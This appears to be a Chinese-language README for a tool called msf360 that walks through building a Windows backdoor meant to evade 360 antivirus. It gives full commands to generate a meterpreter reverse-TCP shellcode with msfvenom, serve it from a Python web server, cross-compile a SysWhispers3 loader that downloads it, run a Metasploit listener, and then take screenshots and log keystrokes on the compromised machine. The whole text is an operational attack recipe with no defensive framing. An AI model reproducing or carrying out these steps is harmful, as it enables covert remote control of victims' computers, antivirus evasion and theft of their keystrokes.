# msf360
kali 后门 免杀 过360
第一步：在kali中使用msfvenom生成Shellcode:"msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=x.x.x.x lport=4444 -f raw -o beacon.bin"
第二步：使用python3开启Web服务
  1.新建一个文件夹作为web服务的目录:"mkdir http"
  2.将生成的‘beacon.bin’移动到目录http:"mv beacon.bin ./http/"
  3.启动web服务:"sudo python3 -m http.server -d ./http/"
第三步：生成exe文件
  1.修改SysWhispers3WinHttp.c第40行IP地址
  2.使用Linux64位GCC进行交叉编译:"x86_64-w64-mingw32-gcc -o SysWhispers3WinHttp.exe syscalls64.c SysWhispers3WinHttp.c -masm=intel -w -s -lwinhttp -O1"
  3.将生成的exe文件拷贝到windows机器里
第四步：开启msf监听
  1.进入框架：“msfconsole”
  2.使用监听模块：“use exploit/multi/handler”
  3.设置载荷：‘set payload windows/x64/meterpreter/reverse_tcp’
  4.设置ip和端口和第一步一致：“set LHOST "x.x.x.x" “set lport 4444”
  5.运行：“run”
第五步：运行后门

第六步：监听机器
  1.显示会话:"sessions -l"
  2.进入会话：“session 2”
  3.退出会话：“bg”
  4.基础信息查看
    -1.查看系统信息：“sysinfo”
    -2.查看用户权限：“getuid”
    -3.截图：‘screenshot ’
    -4.开启键盘记录功能：‘keyscan_start’
    -5.显示捕捉到的键盘记录信息：‘keyscan_dump ’
